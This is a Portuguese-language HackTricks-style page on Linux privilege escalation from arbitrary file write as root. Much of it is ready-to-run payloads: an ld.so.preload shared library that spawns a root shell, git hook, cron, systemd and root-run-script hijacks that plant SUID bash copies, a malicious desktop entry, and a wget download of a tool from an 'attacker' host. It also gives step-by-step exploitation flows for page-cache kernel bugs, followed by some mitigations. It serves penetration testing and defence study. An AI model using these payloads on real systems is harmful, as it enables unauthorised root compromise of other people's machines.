# Escrita Arbitrária de Arquivo no Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` é uma lista de objetos compartilhados de todo o sistema que o dynamic linker carrega antes de outros objetos compartilhados. O modo de execução segura aplica restrições adicionais ao preloading, portanto um caminho de biblioteca como `/tmp/pe.so` não é uma técnica universal para binários SUID.\
Se você puder criá-lo ou modificá-lo, um processo que carregar o arquivo carregará a biblioteca listada antes de seus outros objetos compartilhados, permitindo a execução de código no contexto desse processo.<sup>[[12]](#references)</sup>

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** são scripts executáveis executados em eventos de um repositório, incluindo operações de commit e merge. Se um **script ou usuário privilegiado** realizar essas ações e um atacante puder **escrever na pasta `.git`**, o hook poderá ser usado para **escalada de privilégios**.<sup>[[13]](#references)</sup>

Por exemplo, é possível **gerar um script** em um repositório git dentro de **`.git/hooks`** para que ele seja sempre executado quando um novo commit for criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Arquivos de Cron e de tempo

Se você puder **escrever arquivos relacionados ao cron que o root executa**, geralmente poderá obter code execution na próxima execução do job. Os alvos interessantes incluem:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- O próprio crontab do root em `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Timers do `systemd` e os serviços que eles acionam

Verificações rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Caminhos típicos de abuso:

- **Adicionar um novo root cron job** a `/etc/crontab` ou a um arquivo em `/etc/cron.d/`
- **Substituir um script** já executado por `run-parts`
- **Criar um backdoor em um alvo de timer existente** modificando o script ou binário que ele inicia

Exemplo mínimo de cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se você só puder escrever dentro de um diretório do cron usado por `run-parts`, coloque um arquivo executável lá:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Observações:

- `run-parts` geralmente ignora nomes de arquivos que contêm pontos, portanto prefira nomes como `backup` em vez de `backup.sh`.<sup>[[15]](#references)</sup>
- Alguns sistemas usam timers do `systemd` em vez do cron clássico, mas a ideia do abuso é a mesma: **modificar o que o root executará posteriormente**.<sup>[[20]](#references)</sup>

### Arquivos de Service & Socket

Se você puder escrever **arquivos de unit do `systemd`** ou arquivos referenciados por eles, poderá obter execução de código como root recarregando e reiniciando a unit, ou aguardando o acionamento do caminho de ativação do serviço/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Os alvos interessantes incluem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Overrides drop-in em `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binários de serviço referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Caminhos graváveis de `EnvironmentFile=` carregados por um serviço executado como root

Verificações rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Caminhos comuns de abuso:

- **Sobrescrever `ExecStart=`** em uma service unit de propriedade do root que você pode modificar
- **Adicionar um drop-in override** com um `ExecStart=` malicioso e limpar o antigo primeiro
- **Criar um backdoor no script/binário** já referenciado pela unit
- **Sequestrar um serviço ativado por socket** modificando o arquivo `.service` correspondente, que é iniciado quando o socket recebe uma conexão

Exemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Fluxo típico de ativação:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se você não puder reiniciar os serviços por conta própria, mas puder editar uma unidade ativada por socket, talvez só precise **aguardar uma conexão de cliente** para acionar a execução do serviço com backdoor como root.<sup>[[17]](#references)</sup>

### Sobrescrever um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons personalizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restritivo** (por exemplo, `disable_functions=exec,system,...`). Se o código no sandbox ainda tiver **qualquer primitive de escrita** (como `file_put_contents`) e você conseguir alcançar o **caminho exato do `php.ini`** usado pelo daemon, poderá **sobrescrever essa configuração** para remover as restrições e, em seguida, enviar um segundo payload que seja executado com privilégios elevados.<sup>[[2]](#references)</sup>

Fluxo típico:

1. O primeiro payload sobrescreve a configuração do sandbox.
2. O segundo payload executa o código agora que as funções perigosas foram reativadas.

Exemplo mínimo (substitua pelo caminho usado pelo daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se o daemon for executado como root (ou validar com paths pertencentes ao root), a segunda execução resultará em um contexto root. Isso é essencialmente **privilege escalation via config overwrite** quando o runtime em sandbox ainda pode escrever arquivos.

### binfmt_misc

`binfmt_misc` expõe registrations em `/proc/sys/fs/binfmt_misc`; cada registration associa um padrão de tipo de arquivo a um interpreter. O impacto nos privilégios depende de quem pode alterar a registration e de qual processo posteriormente executa o arquivo correspondente; portanto, verifique esses requisitos antes de considerar isso um caminho de privilege escalation.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Ambientes desktop usam associações MIME e desktop entries para escolher uma aplicação para URI schemes; um atacante que possa escrever a configuração relevante por usuário e os diretórios de desktop entries pode redirecionar esses schemes para um launcher sob seu controle. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os handlers de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), um clique do usuário pode invocar essa desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root executando scripts/binários graváveis pelo usuário

Se um workflow privilegiado executar algo como `/bin/sh /home/username/.../script` (ou qualquer binário dentro de um diretório pertencente a um usuário sem privilégios), você pode sequestrá-lo:<sup>[[1]](#references)</sup>

- **Detecte a execução:** monitore processos com pspy para identificar o root invocando paths controlados pelo usuário.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmar a possibilidade de escrita:** garantir que tanto o arquivo de destino quanto o diretório pertençam ao seu usuário e sejam graváveis por ele.
- **Hijack the target:** fazer backup do binário/script original e inserir um payload que crie uma shell SUID (ou execute qualquer outra ação como root) e, em seguida, restaurar as permissões:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Acione a ação privilegiada** (por exemplo, pressionando um botão da UI que inicia o helper). Quando o root executar novamente o path sequestrado, obtenha o shell escalado com `./rootshell -p`.

### Modificação somente do page cache de arquivos binários privilegiados

Alguns bugs do kernel não modificam o arquivo **no disco**. Em vez disso, permitem modificar apenas a **cópia no page cache** de um arquivo legível. Se você conseguir atingir um binário **setuid** ou executado de outra forma pelo **root**, a próxima execução poderá executar bytes controlados pelo atacante a partir da memória e escalar privilégios, mesmo que o hash do arquivo no disco permaneça inalterado.<sup>[[3]](#references)[[4]](#references)</sup>

Isso é útil para pensar nessa técnica como uma **primitive de escrita de arquivo somente em runtime**:<sup>[[3]](#references)</sup>

- **O disco permanece limpo**: o inode e os bytes no disco não mudam
- **A memória fica suja**: processos que leem/executam a página em cache obtêm o conteúdo modificado pelo atacante
- **O efeito é temporário**: a alteração desaparece após uma reinicialização ou a remoção da página do cache

Essa primitive fica entre a **arbitrary file write** clássica e bugs mais antigos de abuso do **page cache**, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependia de uma race
- Dirty Pipe tinha restrições sobre a posição de escrita
- Uma primitive somente de page cache pode ser mais confiável se o caminho vulnerável fornecer escritas diretas em páginas file-backed armazenadas em cache

#### Fluxo genérico de privesc

1. Obtenha uma primitive do kernel capaz de escrever em **páginas do page cache file-backed**
2. Use-a contra um **binário privilegiado legível** ou outro arquivo executado pelo root
3. Acione a execução **antes** que a página seja removida do cache
4. Obtenha execução de código como root enquanto o arquivo no disco continua parecendo inalterado

Alvos típicos de alto valor:

- Binários **setuid-root**
- Helpers iniciados por **serviços do root**
- Binários normalmente executados a partir de **containers que compartilham o kernel/page cache do host**

#### Caminho de exemplo com AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) é um bom exemplo dessa classe. O caminho vulnerável estava na API de userspace de criptografia do Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` pode mover referências a páginas do page cache de um arquivo legível para o scatterlist TX de criptografia
- o caminho de decrypt in-place do `algif_aead` reutilizava os buffers de origem e destino
- `authencesn` então escrevia na região de tag do destino
- quando essa região ainda referenciava páginas file-backed obtidas via splice, a escrita era feita no **page cache do arquivo-alvo**

Portanto, a técnica interessante não é o próprio CVE, mas o padrão:

- **inserir páginas de cache file-backed em um subsistema do kernel**
- fazer o subsistema **tratá-las como saída gravável**
- acionar uma sobrescrita pequena e controlada na memória

O PoC público usava **escritas repetidas de 4 bytes** para modificar `/usr/bin/su` na memória e depois executá-lo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Caminho de exemplo com ESP / XFRM + clone TEE do netfilter

DirtyClone (CVE-2026-43503) mostra outra variante do mesmo padrão de **page-cache-only write-to-root**, mas desta vez o sink é o **decrypt do IPsec ESP**, em vez de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

A técnica importante é a etapa de **metadata-laundering**:

- `splice()` coloca uma **página do page cache file-backed somente leitura** em um pacote ESP-in-UDP
- a mitigação original do DirtyFrag marcava esse skb com `SKBFL_SHARED_FRAG` para que `esp_input()` **copiasse antes de realizar o decrypt**
- o netfilter `TEE` duplica o pacote por meio de `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- o clone mantém a **mesma referência física à página do page cache**, mas perde `SKBFL_SHARED_FRAG`
- `esp_input()` então trata o clone como seguro e executa o **decrypt in-place de `cbc(aes)`** sobre a página file-backed

Portanto, a lição para o reviewer é mais ampla que o CVE: se uma mitigação depende de **metadados de skb/página** para decidir se uma operação precisa copiar primeiro, qualquer **caminho de clone/cópia que preserve a página subjacente, mas remova os metadados**, pode reabrir silenciosamente a primitive de escrita.

Fluxo de exploração típico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obter **`CAP_NET_ADMIN` dentro de um network namespace privado**
2. ativar o loopback e instalar uma regra **`TEE` do netfilter** em `mangle/OUTPUT`
3. instalar SAs de transporte XFRM ESP via `NETLINK_XFRM`
4. codificar cada palavra de 4 bytes-alvo no campo `seq_hi` da SA (a técnica de seleção de palavras do DirtyFrag)
5. enviar o pacote ESP-in-UDP obtido via splice para que o **clone TEE** alcance `esp_input()` e faça o decrypt **in-place**
6. repetir até que a cópia no page cache de `/usr/bin/su` ou de outro executável privilegiado contenha código controlado pelo atacante

Operacionalmente, o impacto é o mesmo do exemplo com `AF_ALG`: o arquivo no disco permanece limpo, mas `execve()` consome os **bytes modificados do page cache** e fornece root.<sup>[[8]](#references)[[9]](#references)</sup>

Verificações úteis de exposição para essa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
A redução da attack surface de curto prazo também é específica ao caminho neste caso: atualizar para um kernel que contenha `48f6a5356a33` corrige o caminho de clone, enquanto bloquear o autoload de `xt_TEE` remove a **flag-laundering step** e bloquear `esp4` / `esp6` remove o **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposição e hunting

Se você suspeitar dessa classe de bug, não dependa apenas de verificações de integridade do disco. Verifique também:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Os valores de configuração abaixo distinguem uma interface carregável de uma incorporada ao kernel; as regras de compilação de crypto mapeiam `CONFIG_CRYPTO_USER_API_AEAD` para `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` pode ser carregável/descarregável como um módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: a interface é incorporada ao kernel
- binários setuid são bons alvos porque um patch apenas no page cache pode ser suficiente para transformar um foothold local em root

#### Redução da superfície de ataque para o caminho `algif_aead`

Se a interface vulnerável for fornecida por um módulo carregável:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se for compilado no kernel, alguns disclosures relataram bloquear o caminho de init com:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Vale a pena lembrar desse tipo de mitigation também para outros kernel LPEs: se a exploração depender de uma interface opcional específica, desabilitar ou colocar essa interface na blacklist pode interromper o caminho do exploit mesmo antes de uma atualização completa do kernel estar disponível.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking de um script executado como root em um diretório do PaperCut gravável pelo usuário](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ do Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgação do CVE-2026-31431 no oss-security da Openwall](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correção no Linux stable: crypto: algif_aead - Reverter para a operação out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory do CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint: writeup técnico](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositório / README do DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecando e explorando a variante de Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correção no Linux: net: skb: preservar `SKBFL_SHARED_FRAG` em `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigation anterior no Linux: definir `SKBFL_SHARED_FRAG` para pacotes UDP divididos (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — página do manual do Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — página do manual do Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentação do Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associações de aplicações MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Especificação de informações MIME compartilhadas](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Especificação de Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguagem Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile de crypto do Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilidade de page cache do Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
